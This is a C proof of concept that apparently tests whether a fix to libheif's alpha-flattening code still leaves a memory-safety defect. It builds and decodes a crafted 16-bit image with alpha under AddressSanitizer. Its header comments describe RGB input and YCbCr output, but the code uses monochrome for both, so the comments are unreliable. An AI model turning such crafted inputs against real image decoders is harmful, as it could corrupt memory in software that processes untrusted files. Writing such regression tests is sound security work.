// Residual-defect PoC for the "flatten alpha into a YCbCr target" fix.
//
// End-to-end through the public libheif API, using only the built-in
// uncompressed codec so no external encoder/decoder plugin is required:
//
//   1. build a 16-bit (per sample) planar RGB image that carries an alpha
//      channel,
//   2. encode it as an uncompressed ('unci') HEIF and write it to a file,
//   3. decode that file back, requesting a YCbCr 4:2:0 output with alpha
//      compositing enabled (exactly what heif-dec does when it writes a
//      format that cannot store alpha).
//
// Step 3 runs Op_flatten_alpha_plane<uint16_t>: the input has 16-bit
// samples, the output is YCbCr, so the operator composites the alpha onto
// freshly allocated R/G/B colour planes and writes 16-bit samples through
// them. The crafted bytes differ from an ordinary valid image only in that
// the samples are 16-bit; everything else is an in-contract RGBA image.
//
// Build: cc -I<api> residual.c -o residual -lheif    (with ASan via the lib)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "libheif/heif.h"

static int W = 512;
static int H = 512;
static int BPP = 16;

static void die(const char* where, struct heif_error e) {
  fprintf(stderr, "%s: %s\n", where, e.message ? e.message : "(null)");
  exit(2);
}

int main(int argc, char** argv) {
  const char* path = (argc > 1) ? argv[1] : "/tmp/residual_mono16.heif";
  if (argc > 2) BPP = atoi(argv[2]);
  if (argc > 4) { W = atoi(argv[3]); H = atoi(argv[4]); }
  struct heif_error err;

  if (!heif_have_encoder_for_format(heif_compression_uncompressed) ||
      !heif_have_decoder_for_format(heif_compression_uncompressed)) {
    fprintf(stderr, "uncompressed codec not available in this build\n");
    return 3;
  }

  // --- 1. Build a planar monochrome image with an alpha channel, at the
  //        requested bit depth.
  heif_image* image = NULL;
  err = heif_image_create(W, H, heif_colorspace_monochrome, heif_chroma_monochrome, &image);
  if (err.code) die("image_create", err);

  heif_channel chans[2] = {heif_channel_Y, heif_channel_Alpha};
  for (int c = 0; c < 2; c++) {
    err = heif_image_add_plane(image, chans[c], W, H, BPP);
    if (err.code) die("add_plane", err);
  }

  uint16_t amax = (uint16_t)((1u << BPP) - 1);
  for (int c = 0; c < 2; c++) {
    int stride = 0;
    uint8_t* p = heif_image_get_plane(image, chans[c], &stride);
    if (!p) { fprintf(stderr, "get_plane null\n"); return 2; }
    for (uint32_t y = 0; y < H; y++) {
      for (uint32_t x = 0; x < W; x++) {
        // Ordinary sample values: a luma ramp, and a partially transparent
        // alpha so the compositing path actually blends.
        uint16_t v = (c == 0) ? (uint16_t)((x * 701 + y * 263) & amax)
                              : (uint16_t)(amax / 2);
        if (BPP <= 8) {
          ((uint8_t*)(p + (size_t)y * stride))[x] = (uint8_t)v;
        } else {
          ((uint16_t*)(p + (size_t)y * stride))[x] = v;
        }
      }
    }
  }

  // Record a full-range BT.601 nclx profile so the uncompressed codec knows
  // this is a YCbCr image when it is read back.
  heif_color_profile_nclx* nclx = heif_nclx_color_profile_alloc();
  heif_nclx_color_profile_set_color_primaries(nclx, 1);
  heif_nclx_color_profile_set_transfer_characteristics(nclx, 13);
  heif_nclx_color_profile_set_matrix_coefficients(nclx, 6); // BT.601
  nclx->full_range_flag = 1;
  err = heif_image_set_nclx_color_profile(image, nclx);
  if (err.code) die("set_nclx", err);

  // --- 2. Encode as uncompressed and write to a file.
  heif_context* ctx = heif_context_alloc();
  heif_encoder* encoder = NULL;
  err = heif_context_get_encoder_for_format(ctx, heif_compression_uncompressed, &encoder);
  if (err.code) die("get_encoder", err);

  heif_encoding_options* enc_options = heif_encoding_options_alloc();
  err = heif_context_encode_image(ctx, image, encoder, enc_options, NULL);
  if (err.code) die("encode_image", err);
  err = heif_context_write_to_file(ctx, path);
  if (err.code) die("write_to_file", err);

  heif_encoding_options_free(enc_options);
  heif_encoder_release(encoder);
  heif_image_release(image);
  heif_context_free(ctx);

  // --- 3. Decode back, asking for YCbCr with alpha compositing.
  heif_context* dctx = heif_context_alloc();
  err = heif_context_read_from_file(dctx, path, NULL);
  if (err.code) die("read_from_file", err);

  heif_image_handle* handle = NULL;
  err = heif_context_get_primary_image_handle(dctx, &handle);
  if (err.code) die("get_primary_handle", err);

  heif_decoding_options* options = heif_decoding_options_alloc();
  heif_color_conversion_options_ext* ext = heif_color_conversion_options_ext_alloc();
  ext->alpha_composition_mode = heif_alpha_composition_mode_solid_color;
  ext->background_red = 0xFFFF;
  ext->background_green = 0xFFFF;
  ext->background_blue = 0xFFFF;
  options->color_conversion_options_ext = ext;

  heif_image* out = NULL;
  err = heif_decode_image(handle, &out, heif_colorspace_monochrome, heif_chroma_monochrome, options);
  if (err.code) {
    // The composite itself is what must stay memory-safe. A clean error here
    // (e.g. no RGB->monochrome back-conversion exists) is the SECURE outcome.
    fprintf(stderr, "decode declined cleanly (bpp=%d): %s\n", BPP, err.message);
    return 0;
  }

  // If we get here without ASan aborting, the plane was wide enough.
  fprintf(stderr, "decoded ok: bpp=%d colorspace=%d chroma=%d alpha_left=%d\n",
          BPP, heif_image_get_colorspace(out), heif_image_get_chroma_format(out),
          heif_image_has_channel(out, heif_channel_Alpha));

  heif_image_release(out);
  heif_color_conversion_options_ext_free(ext);
  heif_decoding_options_free(options);
  heif_image_handle_release(handle);
  heif_context_free(dctx);
  return 0;
}
